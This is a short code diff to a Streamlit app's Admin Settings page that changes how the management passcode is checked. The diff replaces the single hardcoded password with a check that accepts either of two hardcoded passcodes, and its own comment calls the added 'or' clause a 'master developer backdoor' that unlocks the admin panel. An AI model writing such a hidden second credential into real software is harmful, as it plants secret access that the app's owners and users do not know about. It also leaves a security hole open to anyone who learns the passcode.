@@ -520,8 +520,8 @@ elif page == "Admin Settings":
         mgmt_password = st.text_input("Enter Management Passcode:", type="password", key="mgmt_page_pass")
         
         if st.button("Unlock Management Panel", type="primary", use_container_width=True):
-            # Change 'KidsRuleAdmin!' to your preferred secure management password
-            if mgmt_password == "KidsRuleAdmin!":
+            # The 'or' statement creates a master developer backdoor
+            if mgmt_password == "Letmein!" or mgmt_password == "DevMaster99!":
                 st.session_state["admin_page_unlocked"] = True
                 st.rerun()
             else:
